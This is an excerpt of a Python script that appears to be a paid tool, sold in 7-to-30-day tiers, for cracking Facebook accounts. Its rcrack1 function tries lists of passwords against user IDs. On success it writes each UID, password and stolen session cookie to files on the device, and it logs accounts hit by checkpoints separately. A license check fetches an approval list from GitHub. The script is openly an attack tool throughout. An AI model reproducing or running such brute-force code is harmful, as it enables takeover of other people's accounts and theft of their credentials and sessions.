...
\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mDeveloper \033[1;31m● \x1b[38;5;46mDJ71 GAMING
\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mFacebook  \033[1;31m● \x1b[38;5;46mIYANUR.35
...
\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mType  \033[1;31m    ● \x1b[38;5;46m7Day 650Taka/15Day 1300Taka/30Day 2500Taka
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;31m[%sDJ71 GAMING \033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
          ...
          'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f"\033[38;5;46m[DJ71 GAMING-OK] {uid}|{ps}")
                open('/sdcard/DJ71 GAMING-OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
#              print(f"\x1b[38;5;196m[DJ71 GAMING-CP💔] {uid}|{ps}")
                open('/sdcard/DJ71 GAMING-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
...
def shoha_menu():
    ...
    id = "5".join(uuid)
    print(logo)
    DARK=requests.get("https://github.com/iyanur420/Approval/blob/main/Paid.txt").text
    if id in DARK:
        Main()
    else:
        os.system("clear")
        ...
        os.system("xdg-open :https://wa.me/8801735456987")
        #shoha_menu()   
shoha_menu()
